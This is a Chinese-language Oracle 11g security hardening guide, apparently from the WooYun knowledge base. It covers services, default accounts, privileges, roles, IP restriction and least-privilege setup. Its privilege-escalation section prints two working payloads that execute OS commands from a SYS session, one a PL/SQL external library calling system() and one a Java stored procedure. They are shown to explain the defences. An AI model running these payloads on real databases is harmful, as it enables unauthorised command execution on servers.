# Oracle 安全配置

2014/07/13 13:49 | [zhangsan](http://drops.wooyun.org/author/zhangsan "由 zhangsan 发布") | [运维安全](http://drops.wooyun.org/category/%e8%bf%90%e7%bb%b4%e5%ae%89%e5%85%a8 "查看 运维安全 中的全部文章") | 占个座先 | 捐赠作者

## 0x01 测试环境

* * *

操作系统：window server 2008 x64 oracle：oracle 11.2.0.1.0

## 0x02 oracle 权限介绍

* * *

1.  oracle 一个实例就是一个数据库，创建一个新的数据库会产生一个新的实例，并且一个实例独立运行一个进程。
2.  一个用户对应一个方案，当用户新建一个数据对象（比如表）之后会在此方案下面。自己访问可以直接访问，其他用户访问需通过“方案名.对象名”的方式。
3.  用户默认拥有自己方案下面的数据对象的权限，其他用户无相应权限。sys，system 默认拥有所有方案的权限。
4.  当一个用户登录 oracle 实例时，首先需要判断用户是有否登录权限，如果没有，直接不能登录，如果有，则登录成功。登录成功之后，会根据用户拥有的权限来决定能做的事情，在进行一项操作时，如果有权限，则操作成功，如果没有权限，则操作失败。
5.  oracle 主要有两个核心进程，一个是 oracle 的服务进程，一个是监听进程，当外部连接 oracle 时，首先是访问的监听进程，由监听进程根据你访问的数据库实例来转发到相应的 oracle 实例进程处理。

## 0x03 oracle 系统服务

* * *

在 window server 2008 中安装的 oracle 11g 总共会有七个服务，这七个服务的含义分别为：

### a. Oracle ORCL VSS Writer Service：

Oracle 卷映射拷贝写入服务，VSS（Volume Shadow Copy Service）能够让存储基础设备（比如磁盘，阵列等）创建高保真的时间点映像，即映射拷贝（shadow copy）。它可以在多卷或者单个卷上创建映射拷贝，同时不会影响到系统的系统能。（非必须启动）

### b. OracleDBConsoleorcl：

Oracle 数据库控制台服务，orcl 是 Oracle 的实例标识，默认的实例为 orcl。在运行 Enterprise Manager（企业管理器 OEM）的时候，需要启动这个服务。（非必须启动）

### c. OracleJobSchedulerORCL：

Oracle 作业调度（定时器）服务，ORCL 是 Oracle 实例标识。（非必须启动）

### d. OracleMTSRecoveryService：

服务端控制。该服务允许数据库充当一个微软事务服务器 MTS、COM/COM+对象和分布式环境下的事务的资源管理器。（非必须启动）

### e. OracleOraDb11g_home1ClrAgent：

Oracle 数据库.NET 扩展服务的一部分。 （非必须启动）

### f. OracleOraDb11g_home1TNSListener：

监听器服务，服务只有在数据库需要远程访问的时候才需要。（非必须启动，但是供外部访问则必须启动）。

### g. OracleServiceORCL：

数据库服务(数据库实例)，是 Oracle 核心服务该服务，是数据库启动的基础， 只有该服务启动，Oracle 数据库才能正常启动。(必须启动)

那么在开发的时候到底需要启动哪些服务呢？

对新手来说，要是只用 Oracle 自带的 sql*plus 的话，只要启动 OracleServiceORCL 即可，要是使用 PL/SQL Developer 等第三方工具的话，OracleOraDb11g_home1TNSListener 服务也要开启。OracleDBConsoleorcl 是进入基于 web 的 EM 必须开启的，其余服务很少用。

## 0x04 oracle 默认账户

* * *

在 oracle11g 安装后，会有很多系统默认账号，除了 4 个外，其他的都处于锁定状态，如无特殊用途，请不要打开。另外 4 个分别为：

1.  SYS 用户 SYS，当创建一个数据库时，SYS 用户将被默认创建并授予 DBA 角色，所有数据库数据字典中的基本表和视图都存储在名为 SYS 的方案中，这些基本表和视图对于 Oracle 数据库的操作是非常重要的。为了维护数据字典的真实性，SYS 方案中的表只能由系统来维护，他们不能被任何用户或数据库管理员修改，而且任何用户不能在 SYS 方案中创建表。

2.  SYSTEM 用户 SYSTEM，与 SYS 一样，在创建 Oracle 数据库时，SYSTEM 用户被默认创建并被授予 DBA 角色，用于创建显示管理信息的表或视图，以及被各种 Oracle 数据库应用和工具使用的内容表 或视图。

3.  DBSNMP 用户 DBSNMP 是 Oracle 数据库中用于智能代理（Intelligent Agent）的用户，用来监控和管理数据库相关性能的用户，如果停止该用户，则无法提取相关的数据信息。

4.  SYSMAN 用户 SYSMAN 是 Oracle 数据库中用于 EM 管理的用户，如果你不用该用户，也可以删除或者锁定。

以上 4 个账户的密码均为安装时候设置的密码，由于一般情况下，DBSNMP 和 SYSMAN 用户不会被使用而被遗漏，建议锁定。

## 0x05 oracle 权限和角色

* * *

### a.权限

oracle 权限分为系统权限和对象权限，当刚刚建立用户时，用户没有任何权限，也不能执行任何操作。如果要执行某种特定的数据库操作，则必须为其授予系统的权限。如果用户要访问其他方案的对象，则必须为其授予对象的权限。

系统权限是指执行特定类型 Sql 命令的权利，它用于控制用户可以执行的一个或是一组数据库操作。比如当用户具有 create table 权限是，可以在其方案中建表，当用户具有 create any table 权限时，可以在任何方案中建表。Oracle 提供了 100 多种系统权限。

常见的系统权限见下表：

| create session |  11.0pt;font-family:宋体;color:black'>连接数据库 |
| create view |  11.0pt;font-family:宋体;color:black'>创建视图 |
| create procedure |  11.0pt;font-family:宋体;color:black'>创建过程、函数、包 |
| create cluster |  11.0pt;font-family:宋体;color:black'>建簇 |
| create table |  11.0pt;font-family:宋体;color:black'>创建表 |
| create public synonym |  11.0pt;font-family:宋体;color:black'>创建同义词 |
| create trigger |  11.0pt;font-family:宋体;color:black'>创建触发器 |

常见的对象权限见下表：

| alter |  11.0pt;font-family:宋体;color:black'>修改表结构 |
| delete |  11.0pt;font-family:宋体;color:black'>删除数据 |
| select |  11.0pt;font-family:宋体;color:black'>查询数据 |
| insert |  11.0pt;font-family:宋体;color:black'>添加数据 |
| update |  11.0pt;font-family:宋体;color:black'>修改数据 |
| index |  11.0pt;font-family:宋体;color:black'>在表上建立索引 |
| references |  11.0pt;font-family:宋体;color:black'>引用 |
| execute |  11.0pt;font-family:宋体;color:black'>执行 |

注：可以用 all 代替 select, update, insert, alter, index, delete

### b. 角色

oracle 角色分为系统角色和自定义角色，自定义角色可以根据需要指定相应的权限，系统角色主要介绍下面 3 个：

DBA: 拥有全部特权，是系统最高权限，只有 DBA 才可以创建数据库结构。

RESOURCE:拥有 Resource 权限的用户只可以创建实体，不可以创建数据库结构。

CONNECT:拥有 Connect 权限的用户只可以登录，不可以创建实体和数据库结构。

对于普通用户：授予 connect, resource 角色。

对于 DBA 管理用户：授予 connect，resource, dba 角色。

## 0x06 oracle 如何建立网站连接用户

* * *

方案一：

1.  使用 system 新建一个用户名，给予 connect，resource 的角色

2.  使用新建的用户登录，然后创建需要的表

3.  使用 system 登录，revoke 新建用户的 connect，resource 角色

4.  使用 system 登录，grant 新建用户 create session 权限

5.  使用 system 登录，给予新建用户在 USERS 表空间的权限

方案二：

1.  使用 system 登录，创建网站需要的表

2.  使用 system 登录，创建一个用户名

3.  使用 system 登录，grant 新建用户 create session 的系统权限，然后根据网站的需要给予所建表的相应的对象权限。

4.  使用 system 登录，给予新建用户在 USERS 表空间的权限

5.  网站访问数据库的时候使用“system.表名”的形式。

## 0x07 oracle 安全配置方案

* * *

### 1.  限制访问 ip

方法一：

防火墙指定，windows 中通过 windows 防火墙中指定监听端口的访问 ip，linux 中通过 iptables 指定监听端口的访问 ip。

方法二：

windows 中可通过 ipsec 指定监听端口的访问 ip。

方法三：

可通过 oracle 的监听器中指定可访问的 ip 在服务器上的文件$ORACLE_HOME/network/admin/sqlnet.ora 中设置以下行：

```
tcp.validnode_checking = yes 
```

允许访问的 ip

```
tcp.invited_nodes = (ip1,ip2…) 
```

不允许访问的 ip

```
tcp.excluded_nodes=(ip1,ip2,……) 
```

1.  修改端口 可以修改监听器的端口，减少扫描量

2.  关闭不必要的服务 可以关闭不必要的服务来减少对外访问，除了 OracleServiceORCL 和 OracleOraDb11g_home1TNSListener 是必须开启的之外，其他的均可以关闭。特别是 OracleDBConsoleorcl 服务的开启会启用 web 版的 EM，访问端口在 1158，如不需要请关闭此服务。

3.  所有的用户均需设置强密码 在设置密码的时候均需要设置 8 位以上的强密码，且包含大小写，数字，特殊字符。

4.  关闭不需要的用户 oracle 默认会有 4 个不锁定的账户，建议锁定 DBSNMP 和 SYSMAN。

5.  特权账户的处理 限制数据库超级管理员远程登录。 a. 在 spfile 中设置 REMOTE_LOGIN_PASSWORDFILE=NONE b.在 sqlnet.ora 中设置 SQLNET.AUTHENTICATION_SERVICES=NONE 禁用 SYSDBA 角色的自动登录

6.  开启日志 可以开启日志对数据库进行审计,但是也会消耗资源，可根据实际情况操作。

7.  网站使用的数据库账号权限最小化 可以根据上面写的网站连接数据库账户推荐的方案建立。

8.  合理使用数据库进程账户 数据库进程账户使用较低权限账户,新建一个新用户，添加数据目录的写权限，如果配置之后跑不起来，可以退而求其次，给予整个数据库目录的完全控制权限。

9.  合理配置数据库进程账户对磁盘的权限 不要给予数据库目录以外的特殊权限，最好是读取权限都不给，可以根据实际情况来安排，原则就是数据库目录给的权限能保证正常运行，其他的目录能不给就不给。

## 0x08 oracle 提权及防御点

* * *

### 1.  通过 PL/SQL 提权

```
create or replace library exec_shell as '$ORACLE_HOME\bin\msvcrt.dll';  
create or replace procedure execmd (command in char) is external name "system" library exec_shell language c; / exec execmd('net user >netaaa.txt'); 
```

### 2.  使用 java 提权

```
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS import java.lang.*; import java.io.*; public class JAVACMD { public static void execCommand (String command) throws IOException { Runtime.getRuntime().exec(command); } }; / CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2) AS LANGUAGE JAVA NAME 'JAVACMD.execCommand (java.lang.String)'; / exec javacmdproc('cmd.exe /c net user > netaaa.txt'); 
```

以上两种方法如果使用 sys 均可以提权成功，而普通权限用户是无法完成上面的操作的。所以防御源头还是只能对 sys 特权账户的管理，但是如果真的特权账户被黑客获取，此时的方法也只有使用低权限的数据库进程账户，以及控制进程账户对磁盘的权限，这样操作能将黑客能够操作的权限降到最低。 至于先对低权限的 oracle 账户提升为 dba 权限，然后进行系统提权的操作本文不讨论，也请大牛提供更好的方法。

## 0x09 oracle 常见操作命令

* * *

### 1.  连接数据库

```
conn sys/mima@orcl as sysdba; 
```

### 2.  新建用户

```
create user yonghuming identified by mima; 
```

### 3.  给用户授权

```
grant connect, resource to yonghuming; grant create session to yonghuming; alter user yonghuming quota unlimited on USERS; grant unlimited tablespace to yonghuming; grant select on testable to yonghuming; 
```

### 4.  取消授权

```
revoke connect , resource from yonghuming; 
```

### 5.  删除锁定（解锁）账号

```
alter user yonghuming lock; alter user yonghuming unlock; drop user yonghuming cascade; 
```

版权声明：未经授权禁止转载 [zhangsan](http://drops.wooyun.org/author/zhangsan "由 zhangsan 发布")@[乌云知识库](http://drops.wooyun.org)

分享到：

### 相关日志

*   [IIS7.5 安全配置研究](http://drops.wooyun.org/papers/1019)
*   [SQL SERVER 2008 安全配置](http://drops.wooyun.org/tips/1670)
*   [对 *nix WEB 服务器的一个隐藏威胁](http://drops.wooyun.org/tips/2646)
*   [Mysql 安全配置](http://drops.wooyun.org/tips/2245)
*   [从乌云看运维安全那点事儿](http://drops.wooyun.org/papers/410)
*   [使用 OpenSSH 证书认证](http://drops.wooyun.org/tips/1055)